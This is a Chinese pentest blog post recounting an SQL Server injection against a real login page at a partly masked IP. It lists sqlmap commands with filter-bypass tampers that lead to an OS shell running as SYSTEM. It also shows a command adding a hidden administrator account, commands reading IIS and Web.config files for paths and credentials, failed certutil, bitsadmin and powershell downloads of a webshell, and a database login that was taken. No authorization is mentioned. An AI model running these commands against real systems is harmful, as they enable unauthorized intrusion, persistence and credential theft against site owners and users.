---
date: 2020-06-22 17:35:07
title: 记一次 SQLServer 注入
description: 注入 bypass
categories:
  - Pentest
tags:
  - SQL注入
  - bypass
---

### 0x00 存在 SQL 注入
总之是遇到一个站，登录的页面，数据包大致如下：
```
POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1
Host: 115.xxx.xxx.xxx:8042
Content-Length: 47
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://115.xxx.xxx.xxx:8042
Referer: http://115.xxx.xxx.xxx:8042/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: ASP.NET_SessionId=bxdzehxa5mvoco1fkrjlbqbt
Connection: close

uname=admin*&pwd=dskfsdkf&valCode=1197&telphone=
```

其中验证码可以绕过，而登录名那里存在注入
![](/img/post/Xnip2020-09-13_22-20-51.jpg)
![](/img/post/Xnip2020-09-13_22-21-32.jpg)

使用 and 1=1、and 1=2 时，发现过滤了空格，用/**/代替
![60](/img/post/Xnip2020-09-13_22-30-08.jpg)
![60](/img/post/Xnip2020-09-13_22-30-34.jpg)

### 0x01 简单看一下

中间件是 IIS，存在 len 函数，确定为 SQLServer
![60](/img/post/Xnip2020-09-13_22-33-36.jpg)

Order by 一下，看看能不能 union，发现有 10 列
![60](/img/post/Xnip2020-09-13_22-34-56.jpg)

尝试 union select
![80](/img/post/Xnip2020-09-13_22-40-54.jpg)

admin 转换为 int 时出错，感觉好像能显示位，测试发现确实可以显示
![80](/img/post/Xnip2020-09-13_22-41-55.jpg)

可以获取数据库版本，可以确定有 union 注入了
![](/img/post/Xnip2020-09-13_22-42-59.jpg)

### 0x02 sqlmap
```sqlmap跑一下：sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment```
![](/img/post/Xnip2020-09-13_22-45-24.jpg)

比较奇怪，手工的时候可以 union 的，先看看 boolean-based 获取数据吧

-\-current-db 倒是能获取到数据库名为 ExamDataP_2019，但是获取表名的时候就返回空了

```sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment -D ExamDataP_2019 --tables```
![](/img/post/Xnip2020-09-13_22-46-35.jpg)

能判断出来有注入，手工测试 and 1=1 时可以，测试 union 也可以，看来确实有过滤

### 0x03 探测过滤
看看过滤了啥，union 比较快，就用 union、-v 5 看下 payload

```sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment --technique=U --current-db -v 5```

直接拿最后一个 payload 测试下
![](/img/post/Xnip2020-09-13_23-05-33.jpg)

提示 98 附近有错误
![80](/img/post/Xnip2020-09-13_23-06-19.jpg)

感觉像过滤了char之类的函数，char 移到显示位，测一下

发现有加号的时候出错，没有的时候就没问题，可能是处理加号了
![80](/img/post/Xnip2020-09-13_23-07-17.jpg)
![80](/img/post/Xnip2020-09-13_23-08-12.jpg)

移到显示位测了下，确实处理加号了，替换为空了
![80](/img/post/Xnip2020-09-13_23-08-59.jpg)

### 0x04 tamper
去网上找了能替换加号的，没有找到相关信息，后来想着 sqlmap 的 tamper 会不会有，结果还真有
![](/img/post/Xnip2020-09-13_23-09-50.jpg)

有两个 tamper，一个是适用 2012 的，一个是 2008 的，我们这里的数据库是 08 的，用 plus2fnconcat.py 这个，可以判断出来数据库了

```sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment,plus2fnconcat --technique=U --current-db```
![](/img/post/Xnip2020-09-13_23-10-55.jpg)

Emmmmm，可以获取数据库表，但是获取表的列名时依然不返回数据
![](/img/post/Xnip2020-09-13_23-12-12.jpg)

### 0x05 再次探测过滤
同样 -v 3 看 payload，然后测试
![](/img/post/Xnip2020-09-13_23-13-06.jpg)

有语法错误，估计又是那个被替换为空了，慢慢试。。。

看了下语句，涉及到的也就是 union、select、concat、cast、from、syscolumns、sysobjects、where、and 这些个可能被过滤的，union、select 没问题，前面测试过了，剩下的被处理的关键字感觉大概率是 from、and。。。。
![70](/img/post/Xnip2020-09-13_23-13-59.jpg)

语法错误。。。应该就是 from 了。能报错，还是想法报错到显示位

emmmm，感觉好像没有哪里过滤。。。但就是有语法错误。。。
![](/img/post/Xnip2020-09-13_23-14-57.jpg)

网上查了下，其实前面的 from 出错是因为表的原因，from 1，没有 1 这个表，所以出错。。。。。

sqlserver 和 mysql 不一样，还是用的少。。。
![90](/img/post/Xnip2020-09-13_23-15-38.jpg)

但是再次找个 pyaload 尝试依然有问题，不返回数据
![70](/img/post/Xnip2020-09-13_23-16-39.jpg)

同样的语句本地测试是可以返回数据的，费解
![80](/img/post/Xnip2020-09-13_23-17-18.jpg)


### 0x06 os-shell
实在没法了，-\-is-dba 为 True，直接 -\-os-shell
```sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.txt --dbms="mssql" --random-agent --prefix="'" --suffix="--" --tamper=space2comment,plus2fnconcat --os-shell```
![](/img/post/Xnip2020-09-13_23-18-11.jpg)

emmmmmm，system，啥都不说了。。。。。
![90](/img/post/Xnip2020-09-13_23-19-19.jpg)

看下端口
![70](/img/post/Xnip2020-09-13_23-19-55.jpg)

添加用户不行，卡死，估计是被拦截了
```net user Guest1 Aa123456. /add & net localgroup administrators Guest1 /add & net user Guest1 /active:yes```
![](/img/post/Xnip2020-09-13_23-20-30.jpg)

看了下 tasklist，有 360，先传个 shell 吧，方便后续渗透

找路径: ```dir /s /b e:\"username.jpg"```
![70](/img/post/Xnip2020-09-13_23-21-31.jpg)

通过 echo 写 txt 判断路径，试了几个都不是，写中文路径提示不存在。。。。。
![](/img/post/Xnip2020-09-13_23-22-51.jpg)

本来网上查可以用 bat 写中文路径文件，用了 certutil、bitsadmin、powershell 都没有下载成功

看下有没有不是不包含中文的 web 路径: ```type C:\Windows\System32\inetsrv\config\applicationHost.config```

发现 80 端口路径为 c:\inetpub\wwwroot\
![85](/img/post/Xnip2020-09-13_23-23-33.jpg)

写一句话: 
![](/img/post/Xnip2020-09-13_23-24-28.jpg)

访问后出错
![70](/img/post/Xnip2020-09-13_23-25-10.jpg)

后续测试发现通过浏览器写中文名的话可以，创建了文件 9d.txt，证明网站路径就是 e:\江xxxx网站\JsWeb\
![90](/img/post/Xnip2020-09-13_23-26-00.jpg)

现在的话就知道了目标的绝对路径为 e:\江xxxx网站\JsWeb\，同时目标的 80 端口的绝对路径为 c:\inetpub\wwwroot\

PS: 由于当时有别的事，没有继续向下做，其实还可以数据库备份 shell 到网站目录，后续也见到了一个不会出现 "/" 应用程序中的服务错误的 webshell

### 0x07 找数据库信息
找 Web.config，```dir /s /b e:\"Web.config"，type e:\b2cexam\web.config```
获取到一个数据库用户名密码user id=kw;password=123456;
![](/img/post/Xnip2020-09-13_23-27-23.jpg)
![](/img/post/Xnip2020-09-13_23-29-21.jpg)
